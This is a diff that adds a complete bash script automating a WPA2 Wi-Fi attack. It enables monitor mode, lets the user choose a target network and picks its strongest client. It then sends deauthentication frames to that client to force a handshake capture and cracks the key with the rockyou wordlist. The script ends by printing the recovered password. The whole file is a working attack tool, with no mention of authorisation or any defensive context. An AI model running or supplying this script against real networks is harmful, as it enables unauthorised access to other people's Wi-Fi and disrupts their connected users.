@@ -1,0 +1,94 @@
+#!/bin/bash
+
+# Check if script is run as root
+if [[ $EUID -ne 0 ]]; then
+   echo "This script must be run as root!" 
+   exit 1
+fi
+
+# Install required tools
+echo "[*] Installing necessary tools..."
+sudo apt update && sudo apt install aircrack-ng -y
+
+# Kill conflicting processes
+echo "[*] Stopping interfering processes..."
+airmon-ng check kill
+
+# Enable monitor mode (if needed)
+echo "[*] Enabling monitor mode on wlan0..."
+airmon-ng start wlan0
+
+# Scan for Wi-Fi networks
+echo "[*] Scanning for Wi-Fi networks. Press Ctrl+C once you find your target..."
+airodump-ng wlan0
+
+# Ask user for target network details
+read -p "Enter target BSSID: " TARGET_BSSID
+read -p "Enter target channel: " TARGET_CHANNEL
+
+# Start capturing handshake in the background
+echo "[*] Capturing WPA2 handshake..."
+airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w capture wlan0 &
+
+# Wait a few seconds for data collection
+sleep 5
+
+# Detect connected clients and select the best one (strongest signal)
+echo "[*] Detecting best client..."
+BEST_CLIENT=$(airodump-ng --bssid $TARGET_BSSID -c $TARGET_CHANNEL wlan0 | awk '{print $1, $6}' | grep -E "([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}" | sort -k2 -n | head -n1 | awk '{print $1}')
+
+if [[ -z "$BEST_CLIENT" ]]; then
+    echo "[!] No clients detected! Try again later."
+    exit 1
+fi
+
+echo "[*] Best client found: $BEST_CLIENT"
+
+# Deauthenticating the best client
+echo "[*] Deauthenticating client ($BEST_CLIENT) to force handshake..."
+aireplay-ng --deauth 10 -a $TARGET_BSSID -c $BEST_CLIENT wlan0
+
+# Wait for handshake capture
+sleep 10
+echo "[*] Checking for handshake..."
+if aircrack-ng capture-01.cap | grep -q "WPA handshake"; then
+    echo "[+] WPA2 Handshake Captured!"
+else
+    echo "[!] Failed to capture handshake. Try again."
+    exit 1
+fi
+
+# Check if rockyou.txt.gz exists and extract if needed
+WORDLIST_PATH="/usr/share/wordlists/rockyou.txt"
+
+if [[ ! -f "$WORDLIST_PATH" ]]; then
+    if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
+        echo "[*] Extracting rockyou.txt.gz..."
+        sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+    else
+        echo "[!] rockyou.txt.gz not found. Install wordlists package!"
+        echo "Run: sudo apt install wordlists"
+        exit 1
+    fi
+fi
+
+# Crack the WPA2 key
+echo "[*] Attempting to crack the WPA2 key..."
+aircrack-ng -w $WORDLIST_PATH -b $TARGET_BSSID capture-01.cap | tee wpa2_key.txt
+
+# Extract the key and display it
+KEY=$(grep -oP '(?<=KEY FOUND! \[).*?(?=\])' wpa2_key.txt)
+
+if [[ -n "$KEY" ]]; then
+    echo "[+] WPA2 Key Found: $KEY"
+else
+    echo "[!] No key found. Try using a better wordlist."
+fi
+
+# Cleanup
+echo "[*] Cleaning up..."
+rm capture-01.cap wpa2_key.txt 2>/dev/null
+airmon-ng stop wlan0
+service NetworkManager restart
+
+echo "[*] Done!"
